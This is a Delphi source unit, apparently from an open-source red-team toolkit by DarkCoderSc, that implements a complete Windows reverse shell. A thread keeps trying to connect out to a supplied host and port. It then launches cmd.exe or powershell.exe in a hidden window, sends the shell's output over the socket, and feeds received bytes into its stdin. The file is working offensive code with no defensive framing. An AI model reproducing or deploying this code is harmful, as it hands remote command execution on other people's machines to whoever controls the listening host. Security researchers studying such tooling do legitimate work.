(*******************************************************************************

  Jean-Pierre LESUEUR (@DarkCoderSc)
  https://www.phrozen.io/
  jplesueur@phrozen.io

  License : MIT

*******************************************************************************)

unit UntStdoutShell;

interface

uses Winsock2, Windows, SysUtils, UntTypesDefs, Classes;

type
  TStdoutShell = class(TThread)
  private
    FSocket         : TSocket;
    FHost           : String;
    FPort           : word;
    FShell          : TShellKind;

    FSockAddrIn     : TSockAddrIn;
    FConnected      : Boolean;

    FShellProcId    : Cardinal;
    FPipeOutWrite   : THandle;

    {@M}
    procedure SetConnected(AValue : Boolean);

    procedure ShellProc();

    function SendBuffer(ABuffer : Pointer; ABufferSize : Int64) : Boolean;

    function WriteStdin(pData : PVOID; ADataSize : DWORD) : Boolean;
    function WriteStdinLn(AStr : AnsiString = '') : Boolean;

    function Build() : Boolean;
    function Connect() : Boolean;
    procedure Close();
  protected
    {@M}
    procedure Execute(); override;
  public
    {@C}
    constructor Create(AHost : String; APort : Word; AShell : TShellKind = skDefault); overload;

    {@M}
    procedure Disconnect();

    {@G}
    property Connected : Boolean read FConnected;
  end;

implementation

uses UntWinApiDefs, UntFunctions, UntGlobalsDefs;

{-------------------------------------------------------------------------------
  ___process
-------------------------------------------------------------------------------}
procedure TStdoutShell.Execute();
begin
  try
    {
      Attempt to connect to server
    }
    while NOT Terminated do begin
      if NOT IsMutexAssigned(LSTDIN_MUTEX_NAME) then
        Exit();

      if Connect() then
        break;

      ///
      Sleep(100);
    end;

    {
      Spawn Shell
    }
    self.ShellProc();
  finally
    ExitThread(0);
  end;
end;

{-------------------------------------------------------------------------------
  Send data by chunk of N Bytes to target server
-------------------------------------------------------------------------------}
function TStdoutShell.SendBuffer(ABuffer : Pointer; ABufferSize : Int64) : Boolean;
var ABytesWritten  : Integer;
    ARet           : Integer;
    APacketSize    : Integer;
begin
  result := False;
  ///

  if (ABufferSize <= 0) then
    Exit();

  if (NOT self.Connected) or (FSocket = INVALID_SOCKET) then
    Exit();
  ///

  ABytesWritten := 0;
  ARet := 0;

  if (ABufferSize > PACKET_SIZE) then begin
    repeat
      if (ABufferSize - ABytesWritten) >= PACKET_SIZE then
        APacketSize := PACKET_SIZE
      else
        APacketSize := (ABufferSize - ABytesWritten);
      ///

      if (APacketSize = 0) then
        break;

      ARet := send(FSocket, PByte(NativeUInt(ABuffer) + ABytesWritten)^, APacketSize, 0);
      if (ARet <= 0) then
        Break;

      Inc(ABytesWritten, ARet);
    until (ABytesWritten >= ABufferSize);
  end else
    ARet := send(FSocket, PByte(ABuffer)^, ABufferSize, 0);

  ///
  result := (ARet > 0);
end;

{-------------------------------------------------------------------------------
  Alias of Close() without any reason
-------------------------------------------------------------------------------}
procedure TStdoutShell.Disconnect();
begin
  self.Close();
end;

{-------------------------------------------------------------------------------
  Gracefully close a valid socket
-------------------------------------------------------------------------------}
procedure TStdoutShell.Close();
begin
  if (FSocket = INVALID_SOCKET) then
    Exit();
  ///

  Shutdown(FSocket, SD_BOTH);
  CloseSocket(FSocket);

  SetConnected(False);

  ///
  FSocket := INVALID_SOCKET;
end;

{-------------------------------------------------------------------------------
  Create a new client socket
-------------------------------------------------------------------------------}
function TStdoutShell.Build() : Boolean;
var ATempSocket : TSocket;
    b           : LongBool;
    dw          : DWORD;
    ptrHostEnt  : PHostEnt;
begin
  result := False;
  ///

  FSocket := INVALID_SOCKET;

  ZeroMemory(@FSockAddrIn, SizeOf(TSockAddrIn));

  ATempSocket := socket(AF_INET, SOCK_STREAM, IPPROTO_IP);
  if (ATempSocket = INVALID_SOCKET) then
    Exit();
  ///

  try
    FSockAddrIn.sin_family      := AF_INET;
    FSockAddrIn.sin_port        := htons(FPort);

    if (FHost <> '') then begin
      FSockAddrIn.sin_addr.S_addr := Inet_Addr(PAnsiChar(AnsiString(FHost)));
      if (FSockAddrIn.sin_addr.S_addr = INADDR_NONE) then begin
        ptrHostEnt := gethostbyname(PAnsiChar(PAnsiChar(AnsiString(FHost))));
        if NOT Assigned(ptrHostEnt) then
          Exit();
        ///

        FSockAddrIn.sin_addr.S_addr := LongInt(PLongInt(ptrHostEnt^.h_addr_list^)^);
      end;
    end else
      FSockAddrIn.sin_addr.S_addr := 16777343; // 127.0.0.1

    FSocket := ATempSocket;

    b := True;
    if (setsockopt(ATempSocket, IPPROTO_TCP, TCP_NODELAY, @b, SizeOf(LongBool)) = SOCKET_ERROR) then
      Exit();

    dw := PACKET_SIZE;
    if (setsockopt(ATempSocket, SOL_SOCKET, SO_RCVBUF, @dw, SizeOf(DWORD)) = SOCKET_ERROR) then
      Exit();

    ///
    result := True;
  finally
    if (ATempSocket = INVALID_SOCKET) then begin
      CloseSocket(ATempSocket);
    end;
  end;
end;

{-------------------------------------------------------------------------------
  Attempt to connect to a server
-------------------------------------------------------------------------------}
function TStdoutShell.Connect() : Boolean;
begin
  result := False;
  ///

  if (FSocket = INVALID_SOCKET) then
    if (NOT self.Build()) then
      Exit();

  SetConnected(Winsock2.connect(FSocket, TSockAddr(FSockAddrIn), SizeOf(TSockAddrIn)) <> SOCKET_ERROR);

  ///
  result := FConnected;
end;

{-------------------------------------------------------------------------------
  Write data to attached shell (stdin)
-------------------------------------------------------------------------------}
function TStdoutShell.WriteStdin(pData : PVOID; ADataSize : DWORD) : Boolean;
var ABytesWritten : DWORD;
begin
  result := False;
  ///

  if (FPipeOutWrite <= 0) then
    Exit();
  ///

  if (NOT WriteFile(FPipeOutWrite, PByte(pData)^, ADataSize, ABytesWritten, nil)) then
    Exit();

  ///
  result := True;
end;

function TStdoutShell.WriteStdinLn(AStr : AnsiString = '') : Boolean;
begin
  AStr := (AStr + #13#10);

  result := WriteStdin(@AStr[1], Length(AStr));
end;

{-------------------------------------------------------------------------------
  Reverse Shell
-------------------------------------------------------------------------------}
procedure TStdoutShell.ShellProc();
var AStartupInfo    : TStartupInfo;
    AProcessInfo    : TProcessInformation;
    ASecAttribs     : TSecurityAttributes;
    APipeInRead     : THandle;
    APipeInWrite    : THandle;
    APipeOutRead    : THandle;
    AProgram        : String;
    ABytesAvailable : DWORD;
    ABuffer         : array of byte;
    ABufferOut      : array of byte;
    ABytesRead      : DWORD;
    pRecvBuffer     : Pointer;
    ATotalRecvdSize : Cardinal;
    b               : Boolean;
    ARet            : Integer;
begin
  try
    ZeroMemory(@AStartupInfo, SizeOf(TStartupInfo));
    ZeroMemory(@AProcessInfo, SizeOf(TProcessInformation));
    ZeroMemory(@ASecAttribs, SizeOf(TSecurityAttributes));
    ///

    ASecAttribs.nLength := SizeOf(TSecurityAttributes);
    ASecAttribs.lpSecurityDescriptor := nil;
    ASecAttribs.bInheritHandle := True;

    if NOT CreatePipe(APipeInRead, APipeInWrite, @ASecAttribs, 0) then
      Exit();

    if NOT CreatePipe(APipeOutRead, FPipeOutWrite, @ASecAttribs, 0) then
      Exit();
    ///
    try
      AStartupInfo.cb          := SizeOf(TStartupInfo);
      AStartupInfo.wShowWindow := SW_HIDE;
      AStartupInfo.hStdOutput  := APipeInWrite;
      AStartupInfo.hStdError   := APipeInWrite;
      AStartupInfo.hStdInput   := APipeOutRead;
      AStartupInfo.dwFlags     := (STARTF_USESTDHANDLES or STARTF_USESHOWWINDOW);

      if (FShell = skDefault) then begin
        SetLastError(0);
        AProgram := GetEnvironmentVariable('COMSPEC');
        if (GetLastError = ERROR_ENVVAR_NOT_FOUND) then
          FShell := skCmd;
      end;

      case FShell of
        skCmd : begin
          AProgram := UntFunctions.GetSystemDirectory() + 'cmd.exe';
        end;

        skPowershell : begin
          AProgram := 'powershell.exe';
        end;
      end;

      UniqueString(AProgram);

      b := CreateProcessW(
                              nil,
                              PWideChar(AProgram),
                              @ASecAttribs,
                              @ASecAttribs,
                              True,
                              0,
                              nil,
                              nil,
                              AStartupInfo,
                              AProcessInfo
      );
      if (NOT b) then
        Exit();
      try
        FShellProcId := AProcessInfo.dwProcessId;

        while NOT Terminated do begin
          try
            if NOT IsMutexAssigned(LSTDIN_MUTEX_NAME) then
              Exit();

            {
                I could not use jobs since they don't seems to work when using : CreateProcessWithLogonW()

                Checking if child process still there!
            }
            case WaitForSingleObject(AProcessInfo.hProcess, 10) of
              WAIT_OBJECT_0 :
                break;
            end;

            if NOT PeekNamedPipe(APipeInRead, nil, 0, nil, @ABytesAvailable, nil) then
              Exit();
            ///

            if (ABytesAvailable > 0) then begin
              {
                Read stdout, stderr
              }
              SetLength(ABuffer, ABytesAvailable);
              SetLength(ABufferOut, ABytesAvailable);
              try
                b := ReadFile(APipeInRead, ABuffer[0], ABytesAvailable, ABytesRead, nil);
                if (NOT b) then
                  break;
                ///

                CharToOemBuffA(@ABuffer[0], @ABufferOut[0], ABytesAvailable);

                if (NOT SendBuffer(@ABufferOut[0], ABytesAvailable)) then
                  break;
              finally
                SetLength(ABuffer, 0);
                SetLength(ABufferOut, 0);
              end;
            end else begin
              {
                Receive data from server with two possibilities:
                  1) Receive data to redirect to stdin.
                  2) Receive prefixed data with "@@" meanning possible kemi command.
              }
              pRecvBuffer := nil;
              ATotalRecvdSize := 0;
              try
                while NOT Terminated do begin
                  if NOT IsMutexAssigned(LSTDIN_MUTEX_NAME) then
                    Exit();

                  // Do we have some data to read ?
                  if (ioctlsocket(FSocket, FIONREAD, ABytesAvailable) = SOCKET_ERROR) then
                    Exit();

                  if (ABytesAvailable = 0) then
                    break;

                  Inc(ATotalRecvdSize, ABytesAvailable);

                  ReallocMem(pRecvBuffer, ATotalRecvdSize);

                  // Retrieve data from server
                  ARet := Recv(
                                FSocket,
                                PByte(NativeUInt(pRecvBuffer) + (ATotalRecvdSize - ABytesAvailable))^,
                                ABytesAvailable,
                                0
                  );

                  if (ARet <= 0) then
                    Exit();
                end;

                if (ATotalRecvdSize > 0) then begin
                    {
                      Write received data to stdin
                    }
                    Inc(ATotalRecvdSize);

                    ReallocMem(pRecvBuffer, ATotalRecvdSize);

                    PByte(NativeUInt(pRecvBuffer) + ATotalRecvdSize - 1)^ := 13;

                    if NOT WriteStdin(pRecvBuffer, ATotalRecvdSize) then
                      break;
                  end;
              finally
                if (ATotalRecvdSize > 0) then
                  FreeMem(pRecvBuffer, ATotalRecvdSize);
              end;
            end;
          finally
            Sleep(10); // Zzzz Zzzz...
          end;
        end;
      finally
        TerminateProcess(AProcessInfo.hProcess, 0);

        CloseHandle(AProcessInfo.hProcess);
      end;
    finally
      CloseHandle(APipeInWrite);
      CloseHandle(APipeInRead);
      CloseHandle(FPipeOutWrite);
      CloseHandle(APipeOutRead);

      FPipeOutWrite := 0;
    end;
  finally
    self.Close();

    ///
    FShellProcId := 0;
  end;
end;

{-------------------------------------------------------------------------------
  ___constructor
-------------------------------------------------------------------------------}
constructor TStdoutShell.Create(AHost : String; APort : word; AShell : TShellKind = skDefault);
begin
  inherited Create(True);
  ///

  self.FreeOnTerminate := True;
  self.Priority        := tpHighest;

  FHost     := AHost;
  FPort     := APort;
  FSocket   := INVALID_SOCKET;
  FShell    := AShell;

  FConnected    := False;
  FShellProcId  := 0;
  FPipeOutWrite := 0;

  self.Resume();
end;

{-------------------------------------------------------------------------------
  Getters / Setters
-------------------------------------------------------------------------------}
procedure TStdoutShell.SetConnected(AValue : Boolean);
begin
  if (FConnected = AValue) then
    Exit();

  FConnected := AValue;

  if FConnected then begin
    //...
  end else begin
    //...
  end;
end;

end.
